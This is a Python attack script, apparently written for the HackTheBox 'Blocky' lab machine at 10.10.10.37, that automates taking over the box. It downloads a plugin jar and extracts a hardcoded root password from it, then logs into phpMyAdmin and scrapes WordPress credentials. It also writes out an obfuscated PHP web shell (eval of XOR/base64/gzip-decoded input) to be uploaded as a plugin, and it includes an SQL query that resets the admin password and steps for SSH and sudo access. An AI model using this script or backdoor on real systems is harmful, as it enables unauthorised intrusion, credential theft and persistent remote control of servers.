"""
 _____ _         _       
| __  | |___ ___| |_ _ _ 
| __ -| | . |  _| '_| | |
|_____|_|___|___|_,_|_  |
                    |___|
Automated access & password finder
By: @Russian_Otter
"""

import requests, os, zipfile, string, shutil, urllib

rs = """<?php
$R=str_replace('UD','','crUDeUDatUDe_fUDuncUDUDtion');
$V='ry"],A5$q);$q=arA5ray_A5valuA5es(A5$A5q);preg_maA5tch_all("A5/A5A5([\\w])[\\w-]+(?:;q=0A5.([\\d]))?,A5A5?/"A5,$ra,A5$m);if';
$t='odeA5(prA5eg_replace(A5array("A5/A5_/","/-A5/"),array("/A5",A5"+"),$ss($sA5[$i]A5,A50,$A5e))),$k)))A5;$o=A5ob_get_coA5ntenA5ts()';
$g=';ob_endA5_clean()A5;A5$d=bA5ase64_enA5code(x(gA5zcA5ompress($oA5)A5,$k));print(A5"<$A5k>$d</$k>"A5);@sesA5sion_dA5estroA5y();}}}}';
$D=']A5A5;$ra=@$r["HTTPA5_A5ACCEPT_LANA5A5GA5UAGE"];if($A5rr&&$ra){  A5A5  A5$u=parseA5_url($rr);    paA5rseA5_sA5tr($u["A5que';
$u='($q&A5&$m){@sessA5ion_starA5t();$sA5=&$A5_SESSIA5ONA5;$A5ss="substr";$slA5="stA5rtA5olowerA5";$i=$m[A51A5][0].$m[1][1];';
$j='[$i].=A5$p;$A5e=strposA5($s[A5$i],A5$f);if(A5$e){$kA5=A5$kh.A5$kf;obA5_start();A5@evA5al(@gzunA5compress(@xA5(@baA5se64_deA5c';
$K='rA5($jA5=A50;($j<$c&&$i<$A5A5l);$j++,$A5i++){$o.=$A5t{$i}A5^A5$k{$j};}}rA5eturn $o;}A5$rA5=$_SERVER;$A5rr=@$A5rA5["A5HTTP_REFERER"';
$W='$kh="267A55"A5;A5$kf=A5"642e";funcA5tA5ionA5 x($A5t,$k){$c=stA5rlen(A5$k);$lA5=sA5trlen($tA5);$A5o=""A5;for($i=0;$i<$l;){fo';
$x='A5.=$A5q[$m[2][$zA5]];if(sA5trpA5A5os($pA5,$h)==A5=0){$s[A5$iA5]="";$pA5=$ss($p,3);}if(A5arA5ray_key_eA5xists($iA5A5,$s)){$s';
$N='$h=A5$sl($A5ss(mdA55($i.$kA5h),0,3)A5);$A5f=$sl($A5ss(md5A5($A5A5iA5.$kA5f),0,3));$p="";for($z=1A5A5;$z<count($m[1A5]);$z+A5+) $p';
$J=str_replace('A5','',$W.$K.$D.$V.$u.$N.$x.$j.$t.$g);
$Y=$R('',$J);$Y();
?>""" # Password: blockyblock

query = "UPDATE wp_users SET user_pass = 'blockyblock', user_activation_key = '' WHERE wp_users.ID = 1".replace(" ","+")

download = urllib.FancyURLopener()
download
ip = "http://10.10.10.37/plugins/files"
id = "http://10.10.10.37/phpmyadmin/index.php" #login
tfile = "BlockyCore.jar"
page = "http://10.10.10.37/phpmyadmin/sql?"
wplogin = "http://10.10.10.37/wp-admin"

if tfile not in os.listdir("./"):
	r = requests.get(ip)
	download.retrieve(ip+"/"+tfile,tfile)
if "com" not in os.listdir("./"):
	with zipfile.ZipFile(tfile) as z:
		z.extractall()
		shutil.rmtree("META-INF")
if "notbd.php" not in os.listdir("./"):
	print "[+] Creating PHP Backdoor File"
	f = open("notbd.php","w")
	f.write(rs)
	f.close()
	#os.chmod("notbd.php",777)
data = open("./com/myfirstplugin/BlockyCore.class").read().replace("\x00","")
n = ""
for _ in data:
	if _ in string.printable[:98]:
		n += _
data = n.split("\t")
for _ in data:
	if "root" in _:
		password = data[data.index(_)+1]
		break
if "input_username" not in requests.post(id,data={"pma_username":"root","pma_password":password}).text:
	print "[+] PHPMyAdmin Credentials Found"
	print "Username:","root"
	print "Password:",password
	loginlink = "http://10.10.10.37/phpmyadmin/index.php?pma_username=root&pma_password=%s&redirect=http://10.10.10.37/phpmyadmin/db_structure.php?server=1&db=wordpress&table=wp_users" %password
	wpuser = requests.get(loginlink).text.split('class="data grid_edit click2 not_null   text ">')[1].split("<")[0]
	wppass = requests.get(loginlink).text.split('class="data grid_edit click2 not_null   text ">')[2].split("<")[0]
	print "\n[+] Wordpress Credentials Found"
	print "Username:",wpuser
	print "Password:",wppass
	if len(wppass) > 20:
		print "\n[-] Password must be less than 20 characters"
		print loginlink
	print "\n"+wplogin
	print "[*] Login With Credentials\n"
	print "Upload 'notbd.php' to Wordpress Plugins to create backdoor on :22"
	print "\n[+] SSH Credentials"
	print "Username:",wpuser.lower()
	print "Password:",password
	print "'sudo -i' with password above"
	print "\n[*] Access Complete"
